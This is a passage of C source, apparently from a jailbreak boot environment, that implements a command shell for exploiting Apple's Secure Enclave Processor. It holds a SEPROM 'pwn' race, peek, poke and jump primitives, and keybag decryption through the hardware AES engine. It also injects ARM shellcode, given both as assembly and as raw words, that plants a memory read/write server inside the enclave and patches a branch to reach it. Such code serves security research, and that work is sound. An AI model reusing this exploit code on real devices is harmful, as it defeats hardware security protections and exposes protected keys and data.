    char* arg1 = command_tokenize(args, 0x1ff - (args - cmd));
    if (!*arg1) {
        arg1 = "41414141";
    }
    uint32_t addr = strtoul(args, NULL, 16);
    uint32_t r0 = strtoul(arg1, NULL, 16);

    sep_blackbird_jump_noreturn((uint32_t)addr, r0);
}
void sep_pwned_boot(const char* cmd, char* args) {
    if (!is_waiting_to_boot) {
        iprintf("sep payload is not waiting to boot\n");
        return;
    }
    is_waiting_to_boot = 0;

    if(!sep_is_pwned) {
        iprintf("sep is not pwned!\n");
        return;
    }

    sep_blackbird_boot(sepbp);
}

void sep_aes_kbag(uint32_t* kbag_bytes_32, uint32_t * kbag_out, char mode) {
    sep_blackbird_write(0xcd300000 + 8, 0x20a - mode); // select key
    // 4 = clk, 8 = ctl, c = sts, 40 = in, 50 = iv, 70 = out

    uint32_t iv[4] = {0};

    for (int i=0; i < (0x30 / 0x10); i++) {
        // load in our kbag

        sep_blackbird_write(0xcd300000 + 0x40, kbag_bytes_32[4 * i + 0]);
        sep_blackbird_write(0xcd300000 + 0x44, kbag_bytes_32[4 * i + 1]);
        sep_blackbird_write(0xcd300000 + 0x48, kbag_bytes_32[4 * i + 2]);
        sep_blackbird_write(0xcd300000 + 0x4c, kbag_bytes_32[4 * i + 3]);

        // load in IV

        sep_blackbird_write(0xcd300000 + 0x50, iv[0]);
        sep_blackbird_write(0xcd300000 + 0x54, iv[1]);
        sep_blackbird_write(0xcd300000 + 0x58, iv[2]);
        sep_blackbird_write(0xcd300000 + 0x5c, iv[3]);

        // clock

        sep_blackbird_write(0xcd300000 + 0x4, 1);

        // wait for decryption

        while (1) {
            uint32_t sts = sep_blackbird_read(0xcd300000 + 0xc);
            if (sts & 1) {
                break;
            }
        }

        // fetch result

        kbag_out[4 * i + 0] = sep_blackbird_read(0xcd300000 + 0x70);
        kbag_out[4 * i + 1] = sep_blackbird_read(0xcd300000 + 0x74);
        kbag_out[4 * i + 2] = sep_blackbird_read(0xcd300000 + 0x78);
        kbag_out[4 * i + 3] = sep_blackbird_read(0xcd300000 + 0x7c);

        // update next IV
        if (mode == 1) { // encrypt
            memcpy(iv, &kbag_out[4 * i + 0], 0x10);
        } else if (mode == 0) { // decrypt
            memcpy(iv, &kbag_bytes_32[4 * i + 0], 0x10);
        }
    }
}
void sep_aes_cmd(char* kbag, char encdec) {
    if(!sep_is_pwned) {
        iprintf("sep is not pwned!\n");
        return;
    }
    uint8_t kbag_bytes[0x30];
    if(strlen(kbag) != 2*0x30 || hexparse(kbag_bytes, kbag, 0x30) != 0)
    {
        iprintf("bad kbag\n");
        return;
    }
    uint8_t kbag_out[0x30] = {0};

    iprintf("kbag in: ");
    for (int i=0; i < 0x30; i++) {
        iprintf("%02X", kbag_bytes[i]);
    }
    iprintf("\n");

    sep_aes_kbag((uint32_t*)kbag_bytes, (uint32_t*)kbag_out, encdec);

    iprintf("kbag out: ");
    for (int i=0; i < 0x30; i++) {
        iprintf("%02X", kbag_out[i]);
    }
    iprintf("\n");
}
void sep_aes_encrypt(const char* cmd, char* args) {
    if (! *args) {
        iprintf("sep encrypt usage: sep encrypt [kbag]\n");
        return;
    }
    sep_aes_cmd(args, 1);
}
void sep_aes_decrypt(const char* cmd, char* args) {
    if (! *args) {
        iprintf("sep decrypt usage: sep decrypt [kbag]\n");
        return;
    }
    sep_aes_cmd(args, 0);
}

void sep_auto(const char* cmd, char* args)
{
    // A7 is entirely unsupported by this interface
    if(socnum == 0x8960)
    {
        return;
    }

    // We may want to change this in the future to:
    // a) Test for sepfw-loaded rather than sepfw-booted
    // b) Allow for fetching sep-fw.img4 elsewhere
    dt_node_t *sep = dt_find(gDeviceTree, "sep");
    if(!sep)
    {
        return;
    }
    uint32_t *xnu_wants_booted = dt_prop(sep, "sepfw-booted", NULL);
    if(!xnu_wants_booted || !*xnu_wants_booted)
    {
        return;
    }

    volatile uint32_t *tz_regbase = TZ_REGS;
    // TZ0 locked
    if(tz_regbase[4] & 0x1)
    {
        return;
    }

    switch(socnum)
    {
        //case 0x8960:
        case 0x7000:
        case 0x7001:
        case 0x8000:
        case 0x8003:
        case 0x8001:
            iprintf("No need to pwn SEP, just booting...\n");
        case 0x8015: // Lowkey skip the message :|
            tz_lockdown();
            seprom_boot_tz0();
            seprom_fwload();
            break;
        case 0x8010:
        case 0x8011:
        case 0x8012:
            seprom_fwload_race();
            break;
    }
}

void sep_step_forward(const char* cmd, char* args) {
    sep_auto(NULL, NULL);
    iprintf("sep auto: 0x%x\n", sepbp);
    
    __asm__ volatile("dsb sy");

    sep_blackbird_write(0xD0E000F8, 0xe3a03000); // mov r3, #0x0
    sep_blackbird_write(0xD0E000FC, 0xe50f30f8); // str r3, [pc, #-0xf8]
    sep_blackbird_write(0xD0E00100, 0xe50f30f8); // str r3, [pc, #-0xf8]
    sep_blackbird_write(0xD0E00104, 0xe50f30f8); // str r3, [pc, #-0xf8]
    sep_blackbird_write(0xD0E00108, 0xeaffffc2); // b #-0xf8

    // patch, LR = 0xD0E000F8
    sep_blackbird_write(0x544, 0xe300e0f8); // MOVW LR, #0x00F8
    sep_blackbird_write(0x548, 0xe34de0e0); // MOVT LR, #0xD0E0

    __asm__ volatile("dsb sy");

    // boot
    sep_blackbird_boot(sepbp);

    uint32_t volatile* arg0 = (uint32_t*)0x210E00010;
    while (1) {
        __asm__ volatile("dsb sy");
        uint32_t tmp = *arg0;
        if ((tmp != 0) && (tmp != sepbp)) {
            break;
        }
    }
    sepbp = *arg0;

    iprintf("sep step: 0x%x\n", sepbp);
}

void sep_step_forward2(const char* cmd, char* args) {
    iprintf("sep step2: inject rw server\n");

    // inject rw server
    __asm__ volatile("dsb sy");
    /*
    .macro PRTS_FlushCache
      DSB SY
      ISB SY
    .endm

    .macro PRTS_DisableMMU
      PRTS_FlushCache
      MRC    p15, #0, $0, c1, c0, #0
      BIC $0, $0, #1
      MCR    p15, #0, $0, c1, c0, #0
      PRTS_FlushCache
    .endm

    .macro PRTS_EnableMMU
      PRTS_FlushCache
      MRC    p15, #0, $0, c1, c0, #0
      ORR $0, $0, #1
      MCR    p15, #0, $0, c1, c0, #0
      PRTS_FlushCache
    .endm

    .text
    .code 32
      B L_CODE_Entry

    @ iOS-v14.1
    L_ADDR_PT:
      .word 0x80013008
    L_ADDR_JumpBack:
      .word 0x80005BDC

    L_DATA_PT_Value:
      .word 0x00000629, 0x00000002

    @ Protocol:
    @   +4: Address
    @   +8: Value
    @   +C: Command
    L_ADDR_RWAddr:
      .word 0x50E00004 // 0x210E00004
    L_ADDR_RWVal:
      .word 0x50E00008 // 0x210E00008

    @ CMD:
    @   0: Nothing
    @   1: Read
    @   2: Write Phys
    @   3: Write Virt
    @   4: Copy Page
    L_ADDR_RWCmd:
      .word 0x50E0000C // 0x210E0000C

    L_ADDR_CopyPageDest:
      .word 0x50E00200 // 0x210E00200

    L_CODE_Entry:
      PUSH {R0-R12}
      DSB SY
      LDR R3, L_ADDR_PT
      LDR R3, [R3]
      CMP R3, #0x0
      LDR R3, L_ADDR_PT
      BNE L_CODE_RWSrv
      ADR R4, L_DATA_PT_Value
      LDRD R6, R7, [R4, #0x00]
      STRD R6, R7, [R3, #0x00]
      PRTS_FlushCache
      MOV R3, #0x0
      MCR p15, #0, R3, c8, c7, #0
      LDR R3, L_ADDR_RWCmd
      MOV R4, #0x0
      STR R4, [R3]

    L_CODE_RWSrv:
      LDR R3, L_ADDR_RWCmd
      LDR R3, [R3]
      CMP R3, #0x0
      BEQ L_CODE_JumpBack
      CMP R3, #0x1
      BEQ L_CODE_Read
      CMP R3, #0x2
      BEQ L_CODE_WritePhys
      CMP R3, #0x3
      BEQ L_CODE_Write
      CMP R3, #0x4
      BEQ L_CODE_CopyPage
      B L_CODE_JumpBack

    L_CODE_Read:
      LDR R4, L_ADDR_RWAddr
      LDR R5, L_ADDR_RWVal
      LDR R4, [R4]
      @ PRTS_DisableMMU R0
      LDR R4, [R4]
      @ PRTS_EnableMMU R0
      STR R4, [R5]
      B L_CODE_JumpBack

    L_CODE_WritePhys:
      LDR R4, L_ADDR_RWAddr
      LDR R5, L_ADDR_RWVal
      LDR R4, [R4]
      LDR R5, [R5]
      PRTS_DisableMMU R0
      STR R5, [R4]
      PRTS_EnableMMU R0
      B L_CODE_JumpBack

    L_CODE_Write:
      LDR R4, L_ADDR_RWAddr
      LDR R5, L_ADDR_RWVal
      LDR R4, [R4]
      LDR R5, [R5]
      STR R5, [R4]
      B L_CODE_JumpBack

    L_CODE_CopyPage:
      LDR R0, L_ADDR_RWAddr
      LDR R0, [R0]
      LDR R1, L_ADDR_CopyPageDest
      MOV R2, #0x80
    L_CopyPageLoop:
      CMP R2, #0x0
      BEQ L_CODE_JumpBack
      LDMIA R0, { R3, R4, R5, R6, R8, R10, R11, R12 }
      STMIA    R1, { R3, R4, R5, R6, R8, R10, R11, R12 }
      ADD R0, #0x20
      ADD R1, #0x20
      SUB R2, #0x1
      B L_CopyPageLoop

    L_CODE_JumpBack:
      LDR R3, L_ADDR_RWCmd
      MOV R4, #0x0
      STR R4, [R3]
      POP {R0-R12}
      DSB SY
      WFI
      LDR PC, L_ADDR_JumpBack
    */
    sep_blackbird_write(0x1150, 0xea000007);
    sep_blackbird_write(0x1154, 0x80013008);
    sep_blackbird_write(0x1158, 0x80005bdc);
    sep_blackbird_write(0x115c, 0x00000629);
    sep_blackbird_write(0x1160, 0x00000002);
    sep_blackbird_write(0x1164, 0x50e00004);
    sep_blackbird_write(0x1168, 0x50e00008);
    sep_blackbird_write(0x116c, 0x50e0000c);
    sep_blackbird_write(0x1170, 0x50e00200);
    sep_blackbird_write(0x1174, 0xe92d1fff);
    sep_blackbird_write(0x1178, 0xf57ff04f);
    sep_blackbird_write(0x117c, 0xe51f3030);
    sep_blackbird_write(0x1180, 0xe5933000);
    sep_blackbird_write(0x1184, 0xe3530000);
    sep_blackbird_write(0x1188, 0xe51f303c);
    sep_blackbird_write(0x118c, 0x1a000009);
    sep_blackbird_write(0x1190, 0xe24f403c);
    sep_blackbird_write(0x1194, 0xe1c460d0);
    sep_blackbird_write(0x1198, 0xe1c360f0);
    sep_blackbird_write(0x119c, 0xf57ff04f);
    sep_blackbird_write(0x11a0, 0xf57ff06f);
    sep_blackbird_write(0x11a4, 0xe3a03000);
    sep_blackbird_write(0x11a8, 0xee083f17);
    sep_blackbird_write(0x11ac, 0xe51f3048);
    sep_blackbird_write(0x11b0, 0xe3a04000);
    sep_blackbird_write(0x11b4, 0xe5834000);
    sep_blackbird_write(0x11b8, 0xe51f3054);
    sep_blackbird_write(0x11bc, 0xe5933000);
    sep_blackbird_write(0x11c0, 0xe3530000);
    sep_blackbird_write(0x11c4, 0x0a000034);
    sep_blackbird_write(0x11c8, 0xe3530001);
    sep_blackbird_write(0x11cc, 0x0a000006);
    sep_blackbird_write(0x11d0, 0xe3530002);
    sep_blackbird_write(0x11d4, 0x0a00000a);
    sep_blackbird_write(0x11d8, 0xe3530003);
    sep_blackbird_write(0x11dc, 0x0a00001c);
    sep_blackbird_write(0x11e0, 0xe3530004);
    sep_blackbird_write(0x11e4, 0x0a000020);
    sep_blackbird_write(0x11e8, 0xea00002b);
    sep_blackbird_write(0x11ec, 0xe51f4090);
    sep_blackbird_write(0x11f0, 0xe51f5090);
    sep_blackbird_write(0x11f4, 0xe5944000);
    sep_blackbird_write(0x11f8, 0xe5944000);
    sep_blackbird_write(0x11fc, 0xe5854000);
    sep_blackbird_write(0x1200, 0xea000025);
    sep_blackbird_write(0x1204, 0xe51f40a8);
    sep_blackbird_write(0x1208, 0xe51f50a8);
    sep_blackbird_write(0x120c, 0xe5944000);
    sep_blackbird_write(0x1210, 0xe5955000);
    sep_blackbird_write(0x1214, 0xf57ff04f);
    sep_blackbird_write(0x1218, 0xf57ff06f);
    sep_blackbird_write(0x121c, 0xee110f10);
    sep_blackbird_write(0x1220, 0xe3c00001);
    sep_blackbird_write(0x1224, 0xee010f10);
    sep_blackbird_write(0x1228, 0xf57ff04f);
    sep_blackbird_write(0x122c, 0xf57ff06f);
    sep_blackbird_write(0x1230, 0xe5845000);
    sep_blackbird_write(0x1234, 0xf57ff04f);
    sep_blackbird_write(0x1238, 0xf57ff06f);
    sep_blackbird_write(0x123c, 0xee110f10);
    sep_blackbird_write(0x1240, 0xe3800001);
    sep_blackbird_write(0x1244, 0xee010f10);
    sep_blackbird_write(0x1248, 0xf57ff04f);
    sep_blackbird_write(0x124c, 0xf57ff06f);
    sep_blackbird_write(0x1250, 0xea000011);
    sep_blackbird_write(0x1254, 0xe51f40f8);
    sep_blackbird_write(0x1258, 0xe51f50f8);
    sep_blackbird_write(0x125c, 0xe5944000);
    sep_blackbird_write(0x1260, 0xe5955000);
    sep_blackbird_write(0x1264, 0xe5845000);
    sep_blackbird_write(0x1268, 0xea00000b);
    sep_blackbird_write(0x126c, 0xe51f0110);
    sep_blackbird_write(0x1270, 0xe5900000);
    sep_blackbird_write(0x1274, 0xe51f110c);
    sep_blackbird_write(0x1278, 0xe3a02080);
    sep_blackbird_write(0x127c, 0xe3520000);
    sep_blackbird_write(0x1280, 0x0a000005);
    sep_blackbird_write(0x1284, 0xe8901d78);
    sep_blackbird_write(0x1288, 0xe8811d78);
    sep_blackbird_write(0x128c, 0xe2800020);
    sep_blackbird_write(0x1290, 0xe2811020);
    sep_blackbird_write(0x1294, 0xe2422001);
    sep_blackbird_write(0x1298, 0xeafffff7);
    sep_blackbird_write(0x129c, 0xe51f3138);
    sep_blackbird_write(0x12a0, 0xe3a04000);
    sep_blackbird_write(0x12a4, 0xe5834000);
    sep_blackbird_write(0x12a8, 0xe8bd1fff);
    sep_blackbird_write(0x12ac, 0xf57ff04f);
    sep_blackbird_write(0x12b0, 0xe320f003);
    sep_blackbird_write(0x12b4, 0xe51ff164);
    __asm__ volatile("dsb sy");

    // patch
    __asm__ volatile("dsb sy");
    sep_blackbird_write(0x5BD4, 0xe51ff004); // Jump to 0x1150, the rw server
    sep_blackbird_write(0x5BD8, 0x1150);
    __asm__ volatile("dsb sy");

    iprintf("sep boot: 0x%x\n", sepbp);
    is_waiting_to_boot = 0;
    sep_blackbird_boot(sepbp);
}

static struct sep_command command_table[] = {
    SEP_COMMAND("help", "show usage", sep_help),
    SEP_COMMAND("auto", "automatically decide what to do", sep_auto),
#ifndef SEP_AUTO_ONLY
    SEP_COMMAND("ping", "ping seprom", seprom_ping),
    SEP_COMMAND("tz0", "tell seprom to boot_tz0", seprom_boot_tz0),
    SEP_COMMAND("tz0a", "tell seprom to boot_tz0 without waiting", seprom_boot_tz0_async),
    SEP_COMMAND("fwload", "tell seprom to load sepos image", seprom_fwload),
    SEP_COMMAND("artload", "tell seprom to load anti-replay token", seprom_artload),
    SEP_COMMAND("resume", "tell seprom to resume", seprom_resume),
    SEP_COMMAND("panic", "tell seprom to panic", seprom_panic),
    SEP_COMMAND("rand", "ask seprom for randomness", seprom_rand),
    SEP_COMMAND("pwn", "get sep code execution (must run while in seprom before tz0 lockdown / initialization)", seprom_fwload_race),
    SEP_COMMAND("peek", "read a 32 bit value", sep_pwned_peek),
    SEP_COMMAND("poke", "write a 32 bit value", sep_pwned_poke),
    SEP_COMMAND("jump", "jump to address", sep_pwned_jump),
    SEP_COMMAND("boot", "boot pwned tz0 image", sep_pwned_boot),
#endif
    SEP_COMMAND("encrypt", "encrypt a kbag (requires pwned SEPROM)", sep_aes_encrypt),
    SEP_COMMAND("decrypt", "decrypt a kbag (requires pwned SEPROM)", sep_aes_decrypt),
    // Proteas
    SEP_COMMAND("step", "step forward to next stage", sep_step_forward),
    SEP_COMMAND("step2", "step forward to next stage", sep_step_forward2),
};

void sep_help(const char* cmd, char* args) {
    iprintf("sep usage: sep [subcommand] <subcommand options>\nsubcommands:\n");
    for (int i=0; i < sizeof(command_table) / sizeof(struct sep_command); i++) {
        if (command_table[i].name) {
            iprintf("%16s | %s\n", command_table[i].name, command_table[i].desc ? command_table[i].desc : "no description");
        }
    }
}


void sep_cmd(const char* cmd, char* args) {
    char* arguments = command_tokenize(args, 0x1ff - (args - cmd));
    struct sep_command* fallback_cmd = NULL;
    if (arguments) {
        for (int i=0; i < sizeof(command_table) / sizeof(struct sep_command); i++) {
            if (command_table[i].name && !strcmp("help", command_table[i].name)) {
                fallback_cmd = &command_table[i];
            }
            if (command_table[i].name && !strcmp(args, command_table[i].name)) {
                command_table[i].cb(args, arguments);
                return;
            }
        }
        if (*args)
            iprintf("sep: invalid command %s\n", args);
        if (fallback_cmd) return fallback_cmd->cb(cmd, arguments);
    }
}

void sep_setup() {
    uint64_t sep_reg_u = dt_get_u32_prop("sep", "reg");
    sep_reg_u += gIOBase;

    sep_reg = (volatile uint32_t*) sep_reg_u;

    if (socnum == 0x8015) {
        mailboxregs64 = (volatile struct mailbox_registers64 *)(sep_reg_u + 0x8100);
        is_sep64 = 1;
    } else {
        mailboxregs32 = (volatile struct mailbox_registers32 *)(sep_reg_u + 0x4000);
        is_sep64 = 0;
    }

    uint32_t len = 0;
    dt_node_t* dev = dt_find(gDeviceTree, "sep");
    if (!dev) panic("invalid devicetree: no device!");
    uint32_t* val = dt_prop(dev, "interrupts", &len);
    if (!val) panic("invalid devicetree: no prop!");

    if (len != 16) panic("invalid dt entry: sep interrupts != 4");

    struct task* sep_irq_task = task_create_extended("sep", sep_irq, TASK_IRQ_HANDLER|TASK_PREEMPT, 0);

    for (int i=0; i < len/4; i++) {
        // XXX: we skip binding the inbox_empty irq on t8015, because it
        // keeps firing and I don't know why, nor do I think we need it(?)
        if (is_sep64 && val[i] == IRQ_T8015_SEP_INBOX_NOT_EMPTY) {
            continue;
        }
        task_bind_to_irq(sep_irq_task, val[i]);
    }

    task_release(sep_irq_task);
    command_register("sep", "sep tools", sep_cmd);

    if (is_sep64) {
        mailboxregs64->dis_int = 0;
        mailboxregs64->en_int = 0x1000;
    } else {
        mailboxregs32->dis_int = 0;
        mailboxregs32->en_int = 0x1000;
    }
    //seprom_ping();

    //(void)mailboxregs->outbox_val_sep;

}
